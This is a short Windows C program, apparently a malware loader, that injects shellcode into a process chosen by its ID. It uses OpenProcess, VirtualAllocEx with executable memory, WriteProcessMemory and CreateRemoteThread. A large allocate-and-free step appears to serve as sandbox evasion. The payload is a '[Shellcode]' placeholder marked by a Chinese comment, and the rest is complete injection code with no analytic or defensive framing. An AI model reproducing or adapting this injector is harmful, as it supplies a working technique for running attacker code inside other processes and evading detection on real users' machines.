#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

int main(int argc, char* argv[]) {

  unsigned char shellcode[] = "[Shellcode]";  //嵌入Shellcode

  HANDLE ph;
  HANDLE rt;
  PVOID rb;
  DWORD pid;
  pid = atoi(argv[1]);
  char *mem = NULL;
  mem = (char *) malloc(100000000);

  if (mem != NULL) {
    memset(mem, 00, 100000000);
    free(mem);
    ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
    rb = VirtualAllocEx(ph, NULL, sizeof(shellcode), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(ph, rb, shellcode, sizeof(shellcode), NULL);
    rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)rb, NULL, 0, NULL);
    CloseHandle(ph);
    return 0;
  }
}
